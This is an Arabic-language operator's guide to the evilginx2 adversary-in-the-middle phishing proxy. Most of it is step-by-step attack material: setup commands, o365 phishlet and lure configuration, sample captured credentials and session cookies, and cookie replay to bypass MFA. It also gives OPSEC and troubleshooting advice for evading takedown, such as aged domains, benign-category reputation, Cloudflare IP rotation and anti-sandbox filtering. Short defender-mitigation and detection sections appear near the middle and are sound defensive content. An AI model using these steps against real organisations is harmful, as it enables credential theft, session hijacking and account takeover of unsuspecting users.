# evilginx2 — الدليل الكامل للهجمات المتقدمة بنمط AitM

تُعتبر أداة `evilginx2` المعيار الذهبي في هجمات التصيد الاحتيالي بنمط "المهاجم في المنتصف" (Adversary-in-the-Middle - AitM). تعمل الأداة كوكيل (Proxy) شفاف يقوم بتمرير حركة مرور البيانات بين الضحية والموقع الحقيقي (مثل Microsoft أو Google أو Okta)، مما يسمح بـ **التقاط ملفات تعريف الارتباط للجلسة (Session Cookies) بعد نجاح عملية التحقق المتعدد العوامل (MFA)**. يمكن بعد ذلك تحميل هذه الملفات في أي متصفح لتقمص هوية المستخدم بالكامل، متجاوزاً بذلك تقنيات TOTP و Push و SMS.

## التثبيت (Install)

```terminal
git clone https://github.com/kgretzky/evilginx2 && cd evilginx2 && go build
sudo ./evilginx2 -p ./phishlets
```

المتطلبات الأساسية:
- خادم VPS مع توفر المنافذ 80 و 443 و 53.
- نطاق (Domain) مسجل (يفضل أن يكون نطاقاً مشابهاً للنطاق المستهدف - Typosquat).
- توجيه سجلات DNS إلى خادم ال-VPS لنطاق `*.<your domain>`.

## الإعداد الأولي (Initial config)

```
evilginx > config domain login-target-365.com
evilginx > config ip 1.2.3.4              # العنوان الخارجي لخادم ال-VPS
evilginx > config redirect_url https://www.microsoft.com/
```

يُستخدم `redirect_url` لتوجيه الزوار الذين يصلون إلى النطاق الأساسي دون مسار الاستدراج (Lure Path)، وذلك لتبدو العملية طبيعية وغير مشبوهة.

## قوالب التصيد (Phishlets)

قالب التصيد (Phishlet) هو ملف إعداد بصيغة YAML يحدد كيفية التعامل مع خدمة معينة. تشمل القوالب المرفقة: `o365`, `okta`, `outlook`, `linkedin`, `twitter`. كما تتوفر قوالب مجتمعية تغطي Google Workspace, AWS, Salesforce, Citrix وغيرها.

```
evilginx > phishlets
evilginx > phishlets enable o365
evilginx > phishlets get-hosts o365      # يعرض لك سجلات DNS المطلوب إنشاؤها
```

بعد ذلك، قم بإنشاء سجلات من النوع (A records) لهذه المضيفات تشير إلى عنوان IP الخاص بخادمك.

## روابط الاستدراج (Lures) — روابط التصيد الفعلية

```
evilginx > lures create o365
evilginx > lures
evilginx > lures get-url 0
> https://login-target-365.com/abcXYZ
```

يمكن تخصيص رابط الاستدراج:

```
evilginx > lures edit 0 path /onedrive
evilginx > lures edit 0 ua_filter "Mozilla.*Chrome"
evilginx > lures edit 0 redirect_url https://login.microsoftonline.com/  # التوجيه بعد المصادقة
evilginx > lures edit 0 redirector path/to/template/   # صفحة تمويه HTML
```

يعمل `ua_filter` على رفض طلبات الأدوات البرمجية (مثل curl) أو المتصفحات غير المتفاعلة، مما يمثل حماية بسيطة ضد أنظمة الفحص الآلي (Anti-Sandbox).

## الالتقاط الحي (Live capture)

عند نجاح الضحية في عملية المصادقة:

```
[+] new visitor session: o365
[+] credentials captured: alice@target.com :: Pass1!
[+] session cookies captured: ESTSAUTH, ESTSAUTHPERSISTENT
```

استخراج ملفات تعريف الارتباط:

```
evilginx > sessions
evilginx > sessions <id>
> Cookies (JSON form): [...]
```

قم بنسخ مخرجات JSON إلى ملحق Cookie Editor في متصفحك، ثم توجه إلى الموقع الحقيقي — ستجد نفسك مسجلاً للدخول كالمستخدم الضحية، متخطياً الـ MFA بالكامل.

## حلول الدفاع والحد من المخاطر (Defender mitigations)

> [!danger] هجمات AitM تتفوق على الـ MFA التقليدي
> إذا قام المستخدم بإدخال بياناته وإكمال الـ MFA عبر الوكيل الخاص بك، فستحصل على الجلسة. مواجهة هذا الخطر تتطلب **MFA مقاوم للتصيد (Phishing-resistant MFA)** مثل مفاتيح FIDO2 الصلبة أو مفاتيح مرور المنصات (Passkeys)، حيث يرتبط التوثيق تشفيرياً بالنطاق الحقيقي فقط.

- **FIDO2 / WebAuthn / Passkeys** — ترتبط بالنطاق؛ لا يمكن لموقع التصيد إعادة توجيه التوثيق.
- **حماية التوكن (Token Protection)** أو التوكنات المرتبطة بالجهاز في M365 — حيث يكون توكن التحديث صالحاً فقط من جهاز متوافق.
- **الوصول المشروط (Conditional Access)** — طلب جهاز متوافق وتقييم المخاطر؛ حتى لو تمت سرقة ملف الارتباط، سيفشل استخدامه من جهاز المهاجم.
- **تنبيهات تسجيل الدخول من عناوين IP مشبوهة** — رصد استخدام الجلسات من مزودي خدمة السحاب (VPS).

## أفكار للكشف (Detection ideas)

- مراقبة تسجيل النطاقات التي تشبه نطاقات تسجيل الدخول الخاصة بك (Typosquats) عبر سجلات CT.
- فرض سياسات DMARC/DKIM لتقليل فعالية رسائل التصيد البريدي.
- رصد محاولات تسجيل الدخول إلى المستأجر (Tenant) من أرقام الأنظمة المستقلة (ASN) التابعة لمزودي VPS المعروفين.
- تنبيهات Microsoft للـ "السفر غير الاعتيادي" (Atypical travel) مع تغيير بصمة المتصفح (Fingerprint).

## المشاكل التقنية والحلول (Bad output and fixes)

| العرض (Symptom) | السبب المحتمل | الحل |
|---------|-------|-----|
| خطأ TLS في صفحة الدخول | فشل إصدار شهادة Let's Encrypt | تأكد من فتح المنافذ 80/443 قبل تفعيل القالب |
| النموذج يرسل البيانات للموقع الأصلي | القالب (Phishlet) غير متوافق مع تدفق الدخول | استخدم قالباً مجتمعياً محدثاً أو استخدم حقن JS |
| توقف الالتقاط بعد عدة أسابيع | تحديث Microsoft لآلية الدخول | تحديث القالب لمواكبة التغييرات (Phishlet drift) |
| رسالة "لا يمكن الوصول للتطبيق" | حظر IP الوكيل عبر الوصول المشروط | تغيير عنوان الـ VPS أو استخدام CDN كواجهة |
| حظر الرابط من قبل SmartScreen بسرعة | سمعة النطاق سيئة | استخدم نطاقات قديمة (Aged domains) واستخدم حماية Cloudflare |

## أمن العمليات (OPSEC)

- عمر النطاق مهم جداً؛ النطاقات الجديدة (عمرها يوم واحد) يتم تصنيفها كخطر خلال ساعات.
- قم بتصنيف النطاق كـ "سليم" (Benign) قبل الإطلاق (عبر Talos أو Symantec).
- استخدم دائماً CDN مثل Cloudflare لتدوير عناوين IP؛ يصعب على المدافعين حظر شبكة Cloudflare بالكامل.
- راقب السجلات لحظياً واستخدم الجلسات قبل انتهاء صلاحيتها أو تدوير التوكنات.
- استخدم نطاقاً مستقلاً لكل مهمة؛ استخدام نفس ملفات الارتباط عبر حسابات مختلفة قد يكشف العملية برمجياً.

## أدوات ذات صلة (Related tools)

| الأداة | التخصص |
|------|-------|
| **modlishka** | وكيل AitM أقدم يعتمد على الترحيل التلقائي |
| **muraena** | وكيل AitM نشط يدعم هجمات تجميع ملفات الارتباط |
| **EvilProxy** | خدمة AitM تجارية (تستخدم في الأنشطة الإجرامية) |
| **GoPhish** | مدير حملات تصيد كلاسيكي (لا يدعم AitM تلقائياً) |
| **King Phisher** | أداة لإدارة حملات التصيد واختبار الاختراق |
| **Cuddlephish** | متغير يعتمد على تقنية Browser-in-browser |
